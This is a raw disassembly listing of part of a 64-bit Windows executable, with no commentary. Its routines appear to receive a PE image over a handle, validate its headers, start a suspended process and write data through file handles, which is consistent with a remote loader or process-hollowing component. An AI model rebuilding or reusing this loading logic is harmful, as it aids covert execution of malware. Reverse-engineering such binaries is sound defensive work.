   14000178f:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   140001794:	c6 44 24 58 00       	movb   $0x0,0x58(%rsp)
   140001799:	e8 f2 18 00 00       	call   0x140003090
   14000179e:	48 8d 54 24 59       	lea    0x59(%rsp),%rdx
   1400017a3:	c6 44 24 59 00       	movb   $0x0,0x59(%rsp)
   1400017a8:	e8 23 19 00 00       	call   0x1400030d0
   1400017ad:	33 c9                	xor    %ecx,%ecx
   1400017af:	ff 15 53 da 00 00    	call   *0xda53(%rip)        # 0x14000f208
   1400017b5:	cc                   	int3
   1400017b6:	33 db                	xor    %ebx,%ebx
   1400017b8:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   1400017bd:	8b fb                	mov    %ebx,%edi
   1400017bf:	90                   	nop
   1400017c0:	8b c7                	mov    %edi,%eax
   1400017c2:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400017c7:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400017cc:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400017d1:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400017d7:	49 8b ce             	mov    %r14,%rcx
   1400017da:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   1400017de:	ff 15 5c da 00 00    	call   *0xda5c(%rip)        # 0x14000f240
   1400017e4:	85 c0                	test   %eax,%eax
   1400017e6:	0f 84 b6 03 00 00    	je     0x140001ba2
   1400017ec:	83 7c 24 40 02       	cmpl   $0x2,0x40(%rsp)
   1400017f1:	0f 85 ab 03 00 00    	jne    0x140001ba2
   1400017f7:	66 39 1e             	cmp    %bx,(%rsi)
   1400017fa:	74 13                	je     0x14000180f
   1400017fc:	ff c7                	inc    %edi
   1400017fe:	48 83 c6 02          	add    $0x2,%rsi
   140001802:	81 ff 05 01 00 00    	cmp    $0x105,%edi
   140001808:	72 b6                	jb     0x1400017c0
   14000180a:	e9 93 03 00 00       	jmp    0x140001ba2
   14000180f:	4c 8d 4c 24 54       	lea    0x54(%rsp),%r9
   140001814:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001819:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   14000181f:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140001824:	49 8b ce             	mov    %r14,%rcx
   140001827:	ff 15 13 da 00 00    	call   *0xda13(%rip)        # 0x14000f240
   14000182d:	85 c0                	test   %eax,%eax
   14000182f:	0f 84 6d 03 00 00    	je     0x140001ba2
   140001835:	83 7c 24 54 04       	cmpl   $0x4,0x54(%rsp)
   14000183a:	0f 85 62 03 00 00    	jne    0x140001ba2
   140001840:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   140001844:	4c 89 bc 24 90 0a 00 	mov    %r15,0xa90(%rsp)
   14000184b:	00 
   14000184c:	e8 07 19 00 00       	call   0x140003158
   140001851:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   140001856:	4c 8d 4c 24 54       	lea    0x54(%rsp),%r9
   14000185b:	48 8b d0             	mov    %rax,%rdx
   14000185e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001863:	49 8b ce             	mov    %r14,%rcx
   140001866:	4c 8b f8             	mov    %rax,%r15
   140001869:	ff 15 d1 d9 00 00    	call   *0xd9d1(%rip)        # 0x14000f240
   14000186f:	85 c0                	test   %eax,%eax
   140001871:	0f 84 b2 00 00 00    	je     0x140001929
   140001877:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   14000187b:	39 4c 24 54          	cmp    %ecx,0x54(%rsp)
   14000187f:	0f 85 a4 00 00 00    	jne    0x140001929
   140001885:	49 63 47 3c          	movslq 0x3c(%r15),%rax
   140001889:	42 81 3c 38 50 45 00 	cmpl   $0x4550,(%rax,%r15,1)
   140001890:	00 
   140001891:	0f 85 92 00 00 00    	jne    0x140001929
   140001897:	42 0f b7 4c 38 18    	movzwl 0x18(%rax,%r15,1),%ecx
   14000189d:	b8 0b 01 00 00       	mov    $0x10b,%eax
   1400018a2:	66 3b c8             	cmp    %ax,%cx
   1400018a5:	74 19                	je     0x1400018c0
   1400018a7:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400018ac:	66 3b c8             	cmp    %ax,%cx
   1400018af:	75 78                	jne    0x140001929
   1400018b1:	49 8b d7             	mov    %r15,%rdx
   1400018b4:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400018b9:	e8 42 05 00 00       	call   0x140001e00
   1400018be:	eb 69                	jmp    0x140001929
   1400018c0:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1400018c5:	ff 15 6d d9 00 00    	call   *0xd96d(%rip)        # 0x14000f238
   1400018cb:	8b 74 24 50          	mov    0x50(%rsp),%esi
   1400018cf:	83 c6 04             	add    $0x4,%esi
   1400018d2:	8d 1c 00             	lea    (%rax,%rax,1),%ebx
   1400018d5:	8d 7b 02             	lea    0x2(%rbx),%edi
   1400018d8:	03 f7                	add    %edi,%esi
   1400018da:	8b ce                	mov    %esi,%ecx
   1400018dc:	e8 77 18 00 00       	call   0x140003158
   1400018e1:	4c 63 c3             	movslq %ebx,%r8
   1400018e4:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400018e9:	49 83 c0 02          	add    $0x2,%r8
   1400018ed:	48 8b c8             	mov    %rax,%rcx
   1400018f0:	4c 8b f0             	mov    %rax,%r14
   1400018f3:	e8 e8 36 00 00       	call   0x140004fe0
   1400018f8:	8b 54 24 50          	mov    0x50(%rsp),%edx
   1400018fc:	8d 4f 04             	lea    0x4(%rdi),%ecx
   1400018ff:	42 89 14 37          	mov    %edx,(%rdi,%r14,1)
   140001903:	49 03 ce             	add    %r14,%rcx
   140001906:	44 8b 44 24 50       	mov    0x50(%rsp),%r8d
   14000190b:	49 8b d7             	mov    %r15,%rdx
   14000190e:	e8 cd 36 00 00       	call   0x140004fe0
   140001913:	44 8b c6             	mov    %esi,%r8d
   140001916:	49 8b d6             	mov    %r14,%rdx
   140001919:	41 8b cc             	mov    %r12d,%ecx
   14000191c:	e8 af 02 00 00       	call   0x140001bd0
   140001921:	49 8b ce             	mov    %r14,%rcx
   140001924:	e8 27 18 00 00       	call   0x140003150
   140001929:	49 8b cf             	mov    %r15,%rcx
   14000192c:	e8 1f 18 00 00       	call   0x140003150
   140001931:	4c 8b bc 24 90 0a 00 	mov    0xa90(%rsp),%r15
   140001938:	00 
   140001939:	e9 64 02 00 00       	jmp    0x140001ba2
   14000193e:	33 db                	xor    %ebx,%ebx
   140001940:	48 8d b5 70 01 00 00 	lea    0x170(%rbp),%rsi
   140001947:	8b fb                	mov    %ebx,%edi
   140001949:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001950:	8b c7                	mov    %edi,%eax
   140001952:	48 8d 95 70 01 00 00 	lea    0x170(%rbp),%rdx
   140001959:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000195e:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001963:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001969:	49 8b ce             	mov    %r14,%rcx
   14000196c:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   140001970:	ff 15 ca d8 00 00    	call   *0xd8ca(%rip)        # 0x14000f240
   140001976:	85 c0                	test   %eax,%eax
   140001978:	0f 84 24 02 00 00    	je     0x140001ba2
   14000197e:	83 7c 24 40 02       	cmpl   $0x2,0x40(%rsp)
   140001983:	0f 85 19 02 00 00    	jne    0x140001ba2
   140001989:	66 39 1e             	cmp    %bx,(%rsi)
   14000198c:	74 13                	je     0x1400019a1
   14000198e:	ff c7                	inc    %edi
   140001990:	48 83 c6 02          	add    $0x2,%rsi
   140001994:	81 ff 05 01 00 00    	cmp    $0x105,%edi
   14000199a:	72 b4                	jb     0x140001950
   14000199c:	e9 01 02 00 00       	jmp    0x140001ba2
   1400019a1:	8b fb                	mov    %ebx,%edi
   1400019a3:	48 8d 74 24 60       	lea    0x60(%rsp),%rsi
   1400019a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400019af:	00 
   1400019b0:	8b c7                	mov    %edi,%eax
   1400019b2:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400019b7:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   1400019bc:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400019c1:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1400019c7:	49 8b ce             	mov    %r14,%rcx
   1400019ca:	48 8d 14 42          	lea    (%rdx,%rax,2),%rdx
   1400019ce:	ff 15 6c d8 00 00    	call   *0xd86c(%rip)        # 0x14000f240
   1400019d4:	85 c0                	test   %eax,%eax
   1400019d6:	0f 84 c6 01 00 00    	je     0x140001ba2
   1400019dc:	83 7c 24 40 02       	cmpl   $0x2,0x40(%rsp)
   1400019e1:	0f 85 bb 01 00 00    	jne    0x140001ba2
   1400019e7:	66 39 1e             	cmp    %bx,(%rsi)
   1400019ea:	74 13                	je     0x1400019ff
   1400019ec:	ff c7                	inc    %edi
   1400019ee:	48 83 c6 02          	add    $0x2,%rsi
   1400019f2:	81 ff 05 01 00 00    	cmp    $0x105,%edi
   1400019f8:	72 b6                	jb     0x1400019b0
   1400019fa:	e9 a3 01 00 00       	jmp    0x140001ba2
   1400019ff:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   140001a06:	00 
   140001a07:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140001a0c:	4c 8d 85 70 01 00 00 	lea    0x170(%rbp),%r8
   140001a13:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001a18:	48 8d 15 e1 4e 01 00 	lea    0x14ee1(%rip),%rdx        # 0x140016900
   140001a1f:	33 c9                	xor    %ecx,%ecx
   140001a21:	ff 15 d1 d9 00 00    	call   *0xd9d1(%rip)        # 0x14000f3f8
   140001a27:	e9 76 01 00 00       	jmp    0x140001ba2
   140001a2c:	e8 cf 12 00 00       	call   0x140002d00
   140001a31:	e9 6c 01 00 00       	jmp    0x140001ba2
   140001a36:	33 db                	xor    %ebx,%ebx
   140001a38:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140001a3d:	48 8d 54 24 54       	lea    0x54(%rsp),%rdx
   140001a42:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001a47:	49 8b ce             	mov    %r14,%rcx
   140001a4a:	44 8d 43 04          	lea    0x4(%rbx),%r8d
   140001a4e:	ff 15 ec d7 00 00    	call   *0xd7ec(%rip)        # 0x14000f240
   140001a54:	85 c0                	test   %eax,%eax
   140001a56:	0f 84 46 01 00 00    	je     0x140001ba2
   140001a5c:	83 7c 24 40 04       	cmpl   $0x4,0x40(%rsp)
   140001a61:	0f 85 3b 01 00 00    	jne    0x140001ba2
   140001a67:	44 8b 44 24 54       	mov    0x54(%rsp),%r8d
   140001a6c:	33 d2                	xor    %edx,%edx
   140001a6e:	b9 00 10 00 00       	mov    $0x1000,%ecx
   140001a73:	ff 15 47 d6 00 00    	call   *0xd647(%rip)        # 0x14000f0c0
   140001a79:	48 8b f0             	mov    %rax,%rsi
   140001a7c:	48 85 c0             	test   %rax,%rax
   140001a7f:	0f 84 1d 01 00 00    	je     0x140001ba2
   140001a85:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140001a8a:	48 8b c8             	mov    %rax,%rcx
   140001a8d:	ff 15 f5 d6 00 00    	call   *0xd6f5(%rip)        # 0x14000f188
   140001a93:	48 8b ce             	mov    %rsi,%rcx
   140001a96:	85 c0                	test   %eax,%eax
   140001a98:	0f 84 fe 00 00 00    	je     0x140001b9c
   140001a9e:	39 5c 24 48          	cmp    %ebx,0x48(%rsp)
   140001aa2:	8b fb                	mov    %ebx,%edi
   140001aa4:	40 0f 94 c7          	sete   %dil
   140001aa8:	ff 15 6a d7 00 00    	call   *0xd76a(%rip)        # 0x14000f218
   140001aae:	83 ff 01             	cmp    $0x1,%edi
   140001ab1:	75 73                	jne    0x140001b26
   140001ab3:	8b 74 24 54          	mov    0x54(%rsp),%esi
   140001ab7:	b9 80 3e 00 00       	mov    $0x3e80,%ecx
   140001abc:	e8 97 16 00 00       	call   0x140003158
   140001ac1:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140001ac6:	c7 44 24 50 e8 03 00 	movl   $0x3e8,0x50(%rsp)
   140001acd:	00 
   140001ace:	48 8b c8             	mov    %rax,%rcx
   140001ad1:	48 8b f8             	mov    %rax,%rdi
   140001ad4:	e8 27 0f 00 00       	call   0x140002a00
   140001ad9:	85 c0                	test   %eax,%eax
   140001adb:	74 3f                	je     0x140001b1c
   140001add:	8b 54 24 50          	mov    0x50(%rsp),%edx
   140001ae1:	85 d2                	test   %edx,%edx
   140001ae3:	74 37                	je     0x140001b1c
   140001ae5:	41 b8 77 72 00 00    	mov    $0x7277,%r8d
   140001aeb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001af0:	8b cb                	mov    %ebx,%ecx
   140001af2:	48 c1 e1 04          	shl    $0x4,%rcx
   140001af6:	48 03 cf             	add    %rdi,%rcx
   140001af9:	66 44 39 41 04       	cmp    %r8w,0x4(%rcx)
   140001afe:	75 04                	jne    0x140001b04
   140001b00:	39 31                	cmp    %esi,(%rcx)
   140001b02:	74 13                	je     0x140001b17
   140001b04:	ff c3                	inc    %ebx
   140001b06:	3b da                	cmp    %edx,%ebx
   140001b08:	72 e6                	jb     0x140001af0
   140001b0a:	48 8b cf             	mov    %rdi,%rcx
   140001b0d:	e8 3e 16 00 00       	call   0x140003150
   140001b12:	e9 8b 00 00 00       	jmp    0x140001ba2
   140001b17:	e8 e4 10 00 00       	call   0x140002c00
   140001b1c:	48 8b cf             	mov    %rdi,%rcx
   140001b1f:	e8 2c 16 00 00       	call   0x140003150
   140001b24:	eb 7c                	jmp    0x140001ba2
   140001b26:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140001b2b:	48 8d 0d 2e 4e 01 00 	lea    0x14e2e(%rip),%rcx        # 0x140016960
   140001b32:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001b36:	45 33 c9             	xor    %r9d,%r9d
   140001b39:	45 33 c0             	xor    %r8d,%r8d
   140001b3c:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140001b43:	00 
   140001b44:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   140001b49:	44 89 64 24 48       	mov    %r12d,0x48(%rsp)
   140001b4e:	ff 15 d4 d6 00 00    	call   *0xd6d4(%rip)        # 0x14000f228
   140001b54:	48 8b f8             	mov    %rax,%rdi
   140001b57:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001b5b:	74 45                	je     0x140001ba2
   140001b5d:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140001b62:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001b67:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001b6d:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140001b72:	48 8b c8             	mov    %rax,%rcx
   140001b75:	ff 15 b5 d6 00 00    	call   *0xd6b5(%rip)        # 0x14000f230
   140001b7b:	4c 8d 4c 24 50       	lea    0x50(%rsp),%r9
   140001b80:	48 8d 54 24 54       	lea    0x54(%rsp),%rdx
   140001b85:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001b8b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001b90:	48 8b cf             	mov    %rdi,%rcx
   140001b93:	ff 15 97 d6 00 00    	call   *0xd697(%rip)        # 0x14000f230
   140001b99:	48 8b cf             	mov    %rdi,%rcx
   140001b9c:	ff 15 76 d6 00 00    	call   *0xd676(%rip)        # 0x14000f218
   140001ba2:	48 8b 8d 40 09 00 00 	mov    0x940(%rbp),%rcx
   140001ba9:	48 33 cc             	xor    %rsp,%rcx
   140001bac:	e8 7f 15 00 00       	call   0x140003130
   140001bb1:	48 8b 9c 24 98 0a 00 	mov    0xa98(%rsp),%rbx
   140001bb8:	00 
   140001bb9:	48 81 c4 50 0a 00 00 	add    $0xa50,%rsp
   140001bc0:	41 5e                	pop    %r14
   140001bc2:	41 5c                	pop    %r12
   140001bc4:	5f                   	pop    %rdi
   140001bc5:	5e                   	pop    %rsi
   140001bc6:	5d                   	pop    %rbp
   140001bc7:	c3                   	ret
   140001bc8:	cc                   	int3
   140001bc9:	cc                   	int3
   140001bca:	cc                   	int3
   140001bcb:	cc                   	int3
   140001bcc:	cc                   	int3
   140001bcd:	cc                   	int3
   140001bce:	cc                   	int3
   140001bcf:	cc                   	int3
   140001bd0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001bd5:	55                   	push   %rbp
   140001bd6:	56                   	push   %rsi
   140001bd7:	57                   	push   %rdi
   140001bd8:	48 83 ec 60          	sub    $0x60,%rsp
   140001bdc:	48 8b 05 1d 84 01 00 	mov    0x1841d(%rip),%rax        # 0x14001a000
   140001be3:	48 33 c4             	xor    %rsp,%rax
   140001be6:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001beb:	33 ed                	xor    %ebp,%ebp
   140001bed:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   140001bf1:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140001bf6:	48 8d 0d 63 4d 01 00 	lea    0x14d63(%rip),%rcx        # 0x140016960
   140001bfd:	41 8b f8             	mov    %r8d,%edi
   140001c00:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   140001c04:	48 8b f2             	mov    %rdx,%rsi
   140001c07:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   140001c0e:	00 
   140001c0f:	45 33 c9             	xor    %r9d,%r9d
   140001c12:	45 33 c0             	xor    %r8d,%r8d
   140001c15:	ba 00 00 00 c0       	mov    $0xc0000000,%edx
   140001c1a:	ff 15 08 d6 00 00    	call   *0xd608(%rip)        # 0x14000f228
   140001c20:	48 8b d8             	mov    %rax,%rbx
   140001c23:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001c27:	74 47                	je     0x140001c70
   140001c29:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140001c2e:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140001c33:	44 8d 45 04          	lea    0x4(%rbp),%r8d
   140001c37:	48 8b c8             	mov    %rax,%rcx
   140001c3a:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140001c3f:	ff 15 eb d5 00 00    	call   *0xd5eb(%rip)        # 0x14000f230
   140001c45:	48 85 f6             	test   %rsi,%rsi
   140001c48:	74 1d                	je     0x140001c67
   140001c4a:	85 ff                	test   %edi,%edi
   140001c4c:	74 19                	je     0x140001c67
   140001c4e:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   140001c53:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140001c58:	44 8b c7             	mov    %edi,%r8d
   140001c5b:	48 8b d6             	mov    %rsi,%rdx
   140001c5e:	48 8b cb             	mov    %rbx,%rcx
   140001c61:	ff 15 c9 d5 00 00    	call   *0xd5c9(%rip)        # 0x14000f230
   140001c67:	48 8b cb             	mov    %rbx,%rcx
   140001c6a:	ff 15 a8 d5 00 00    	call   *0xd5a8(%rip)        # 0x14000f218
   140001c70:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001c75:	48 33 cc             	xor    %rsp,%rcx
   140001c78:	e8 b3 14 00 00       	call   0x140003130
   140001c7d:	48 8b 9c 24 98 00 00 	mov    0x98(%rsp),%rbx
   140001c84:	00 
   140001c85:	48 83 c4 60          	add    $0x60,%rsp
   140001c89:	5f                   	pop    %rdi
   140001c8a:	5e                   	pop    %rsi
   140001c8b:	5d                   	pop    %rbp
   140001c8c:	c3                   	ret
   140001c8d:	cc                   	int3
   140001c8e:	cc                   	int3
   140001c8f:	cc                   	int3
   140001c90:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001c95:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001c9a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140001c9f:	55                   	push   %rbp
   140001ca0:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   140001ca5:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   140001cac:	48 8b 05 4d 83 01 00 	mov    0x1834d(%rip),%rax        # 0x14001a000
   140001cb3:	48 33 c4             	xor    %rsp,%rax
   140001cb6:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140001cba:	33 f6                	xor    %esi,%esi
   140001cbc:	c7 45 3f 00 00 00 00 	movl   $0x0,0x3f(%rbp)
   140001cc3:	48 8d 45 e7          	lea    -0x19(%rbp),%rax
   140001cc7:	66 c7 45 43 00 01    	movw   $0x100,0x43(%rbp)
   140001ccd:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140001cd2:	48 8b f9             	mov    %rcx,%rdi
   140001cd5:	89 74 24 48          	mov    %esi,0x48(%rsp)
   140001cd9:	48 8d 4d 3f          	lea    0x3f(%rbp),%rcx
   140001cdd:	89 74 24 40          	mov    %esi,0x40(%rsp)
   140001ce1:	45 33 c9             	xor    %r9d,%r9d
   140001ce4:	89 74 24 38          	mov    %esi,0x38(%rsp)
   140001ce8:	45 33 c0             	xor    %r8d,%r8d
   140001ceb:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140001cef:	b2 01                	mov    $0x1,%dl
   140001cf1:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140001cf5:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140001cf9:	ff 15 31 d3 00 00    	call   *0xd331(%rip)        # 0x14000f030
   140001cff:	85 c0                	test   %eax,%eax
   140001d01:	0f 84 bf 00 00 00    	je     0x140001dc6
   140001d07:	48 8b 45 e7          	mov    -0x19(%rbp),%rax
   140001d0b:	4c 8d 4d ef          	lea    -0x11(%rbp),%r9
   140001d0f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001d12:	48 89 45 1f          	mov    %rax,0x1f(%rbp)
   140001d16:	45 33 c0             	xor    %r8d,%r8d
   140001d19:	48 c7 45 17 05 00 00 	movq   $0x5,0x17(%rbp)
   140001d20:	00 
   140001d21:	48 8d 55 f7          	lea    -0x9(%rbp),%rdx
   140001d25:	c7 45 f7 ff 01 1f 00 	movl   $0x1f01ff,-0x9(%rbp)
   140001d2c:	8d 4e 01             	lea    0x1(%rsi),%ecx
   140001d2f:	48 c7 45 fb 02 00 00 	movq   $0x2,-0x5(%rbp)
   140001d36:	00 
   140001d37:	f3 0f 7f 45 03       	movdqu %xmm0,0x3(%rbp)
   140001d3c:	89 75 13             	mov    %esi,0x13(%rbp)
   140001d3f:	ff 15 fb d2 00 00    	call   *0xd2fb(%rip)        # 0x14000f040
   140001d45:	85 c0                	test   %eax,%eax
   140001d47:	75 7d                	jne    0x140001dc6
   140001d49:	8d 56 28             	lea    0x28(%rsi),%edx
   140001d4c:	8d 4e 40             	lea    0x40(%rsi),%ecx
   140001d4f:	ff 15 cb d3 00 00    	call   *0xd3cb(%rip)        # 0x14000f120
   140001d55:	48 8b d8             	mov    %rax,%rbx
   140001d58:	48 85 c0             	test   %rax,%rax
   140001d5b:	74 69                	je     0x140001dc6
   140001d5d:	8d 56 01             	lea    0x1(%rsi),%edx
   140001d60:	48 8b c8             	mov    %rax,%rcx
   140001d63:	ff 15 f7 d2 00 00    	call   *0xd2f7(%rip)        # 0x14000f060
   140001d69:	85 c0                	test   %eax,%eax
   140001d6b:	74 59                	je     0x140001dc6
   140001d6d:	4c 8b 45 ef          	mov    -0x11(%rbp),%r8
   140001d71:	8d 56 01             	lea    0x1(%rsi),%edx
   140001d74:	45 33 c9             	xor    %r9d,%r9d
   140001d77:	48 8b cb             	mov    %rbx,%rcx
   140001d7a:	ff 15 88 d2 00 00    	call   *0xd288(%rip)        # 0x14000f008
   140001d80:	85 c0                	test   %eax,%eax
   140001d82:	74 42                	je     0x140001dc6
   140001d84:	48 8d 45 27          	lea    0x27(%rbp),%rax
   140001d88:	c7 45 27 18 00 00 00 	movl   $0x18,0x27(%rbp)
   140001d8f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001d94:	8d 56 03             	lea    0x3(%rsi),%edx
   140001d97:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140001d9b:	41 b9 ff 00 00 00    	mov    $0xff,%r9d
   140001da1:	c7 44 24 28 00 04 00 	movl   $0x400,0x28(%rsp)
   140001da8:	00 
   140001da9:	45 33 c0             	xor    %r8d,%r8d
   140001dac:	48 8b cf             	mov    %rdi,%rcx
   140001daf:	c7 44 24 20 00 04 00 	movl   $0x400,0x20(%rsp)
   140001db6:	00 
   140001db7:	48 89 5d 2f          	mov    %rbx,0x2f(%rbp)
   140001dbb:	89 75 37             	mov    %esi,0x37(%rbp)
   140001dbe:	ff 15 f4 d3 00 00    	call   *0xd3f4(%rip)        # 0x14000f1b8
   140001dc4:	eb 07                	jmp    0x140001dcd
   140001dc6:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140001dcd:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   140001dd1:	48 33 cc             	xor    %rsp,%rcx
   140001dd4:	e8 57 13 00 00       	call   0x140003130
   140001dd9:	4c 8d 9c 24 d0 00 00 	lea    0xd0(%rsp),%r11
   140001de0:	00 
   140001de1:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140001de5:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140001de9:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140001ded:	49 8b e3             	mov    %r11,%rsp
   140001df0:	5d                   	pop    %rbp
   140001df1:	c3                   	ret
   140001df2:	cc                   	int3
   140001df3:	cc                   	int3
   140001df4:	cc                   	int3
   140001df5:	cc                   	int3
   140001df6:	cc                   	int3
   140001df7:	cc                   	int3
   140001df8:	cc                   	int3
   140001df9:	cc                   	int3
   140001dfa:	cc                   	int3
   140001dfb:	cc                   	int3
   140001dfc:	cc                   	int3
   140001dfd:	cc                   	int3
   140001dfe:	cc                   	int3
   140001dff:	cc                   	int3
   140001e00:	4c 8b dc             	mov    %rsp,%r11
   140001e03:	53                   	push   %rbx
   140001e04:	55                   	push   %rbp
   140001e05:	56                   	push   %rsi
   140001e06:	57                   	push   %rdi
   140001e07:	41 56                	push   %r14
   140001e09:	41 57                	push   %r15
   140001e0b:	48 81 ec f8 00 00 00 	sub    $0xf8,%rsp
   140001e12:	48 8b 05 e7 81 01 00 	mov    0x181e7(%rip),%rax        # 0x14001a000
   140001e19:	48 33 c4             	xor    %rsp,%rax
   140001e1c:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   140001e23:	00 
   140001e24:	33 f6                	xor    %esi,%esi
   140001e26:	4d 89 63 18          	mov    %r12,0x18(%r11)
   140001e2a:	44 8b fe             	mov    %esi,%r15d
   140001e2d:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   140001e32:	4c 8b f2             	mov    %rdx,%r14
   140001e35:	4d 89 6b c8          	mov    %r13,-0x38(%r11)
   140001e39:	48 8b c1             	mov    %rcx,%rax
   140001e3c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001e40:	49 63 5e 3c          	movslq 0x3c(%r14),%rbx
   140001e44:	49 03 de             	add    %r14,%rbx
   140001e47:	81 3b 50 45 00 00    	cmpl   $0x4550,(%rbx)
   140001e4d:	0f 85 ee 01 00 00    	jne    0x140002041
   140001e53:	0f 57 c9             	xorps  %xmm1,%xmm1
   140001e56:	33 c9                	xor    %ecx,%ecx
   140001e58:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   140001e5d:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001e60:	48 89 8c 24 d0 00 00 	mov    %rcx,0xd0(%rsp)
   140001e67:	00 
   140001e68:	45 33 c9             	xor    %r9d,%r9d
   140001e6b:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140001e70:	45 33 c0             	xor    %r8d,%r8d
   140001e73:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   140001e78:	33 d2                	xor    %edx,%edx
   140001e7a:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001e7f:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001e84:	48 8b c8             	mov    %rax,%rcx
   140001e87:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140001e8c:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001e91:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140001e98:	00 
   140001e99:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140001e9d:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   140001ea2:	0f 11 4c 24 70       	movups %xmm1,0x70(%rsp)
   140001ea7:	0f 11 8c 24 80 00 00 	movups %xmm1,0x80(%rsp)
   140001eae:	00 
   140001eaf:	0f 11 8c 24 90 00 00 	movups %xmm1,0x90(%rsp)
   140001eb6:	00 
   140001eb7:	0f 11 8c 24 a0 00 00 	movups %xmm1,0xa0(%rsp)
   140001ebe:	00 
   140001ebf:	0f 11 8c 24 b0 00 00 	movups %xmm1,0xb0(%rsp)
   140001ec6:	00 
   140001ec7:	0f 11 8c 24 c0 00 00 	movups %xmm1,0xc0(%rsp)
   140001ece:	00 
   140001ecf:	ff 15 5b d2 00 00    	call   *0xd25b(%rip)        # 0x14000f130
   140001ed5:	85 c0                	test   %eax,%eax
   140001ed7:	0f 84 5f 01 00 00    	je     0x14000203c
   140001edd:	44 8b 43 50          	mov    0x50(%rbx),%r8d
